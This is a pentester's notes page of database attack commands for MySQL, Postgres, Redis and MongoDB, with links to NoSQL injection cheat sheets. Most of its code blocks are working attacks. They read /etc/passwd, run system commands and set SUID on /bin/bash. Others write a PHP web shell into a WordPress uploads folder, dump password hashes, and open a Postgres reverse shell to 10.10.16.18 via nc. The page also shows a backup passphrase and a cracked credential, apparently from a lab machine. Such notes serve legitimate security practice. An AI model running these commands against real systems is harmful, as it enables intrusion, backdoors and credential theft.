---
layout: notes
permalink: /notes/tech/db/
title: Pentesting Databases
---

# Pentesting Databases

## Firebase
[FirebaseExploiter](https://github.com/securebinary/firebaseExploiter)

## MySQL
```bash
#Basic Commands
mysql -h [host] -p [database] -u username
show databases;
use databasename;
show tables;
select * from tablename;
describe tablename;

#Read files
select load_file("/etc/passwd");

#Run system commands
select sys_eval("whoami");
select sys_eval("chmod u+s /bin/bash");

#PHP Backdoor
SELECT "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wp-content/uploads/shell.php";

#Exctract hashes
select concat_ws(':', user_login, user_pass) from wp_users;
```

## NoSQL
[Hacktricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)\
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)\
[MongoDB Payloads](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)\
[MongoDB Pentest](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)\
[Injection CheatSheet 1](https://nullsweep.com/nosql-injection-cheatsheet/)\
[Injection CheatSheet 2](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)\
[Injection CheatSheet 3](https://www.infoq.com/articles/nosql-injections-analysis/)\
[Injection CheatSheet 4](https://rdsec.net/securec0ding/2019/NoSQL_Injection.html)\
[Injection CheatSheet 5](https://www.stjoern.com/menu-db/nosql)\
[Injection CheatSheet 6](https://securityintelligence.com/does-nosql-equal-no-injection/)\
[Blog part1](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)\
[Blog part2](https://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html)

```bash
#MongoDB
mongo --username "USER" --password --authenticationDatabase "DBNAME" --host "HOSTNAME" --port 27017
```

## Postgres
```bash
#Login
psql -h localhost -U dripmail_dba -d dripmail
<Password>

#Reverse Shell
COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.18 4444t >/tmp/f';

#Dump and Decrypt Database 
# 1- if user hass privileges to access postgress backups
gpg --batch --yes --passphrase "2Qa2SsBkQvsc" --pinentry-mode loopback --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > dev-dripmail.old.sql

# 2- Read the content
cat dev-dripmail.old.sql

# 3- Decrypt hash:
victor.r : superSecretPassword!
```

## Redis
```bash
#Connect via CLI
redis-cli -u redis://xxx.example.com
redis-cli -h <hostname> -p <port> --user <username> -a <password>
redis://:<password>@<hostname>:<port>

#Default Port
nmap -p 6379 10.10.10.10

#Metasploit
use auxiliary/scanner/redis/redis_server
msf auxiliary(scanner/redis/redis_server) > set rhosts 10.10.10.10
msf auxiliary(scanner/redis/redis_server) > exploit
``` 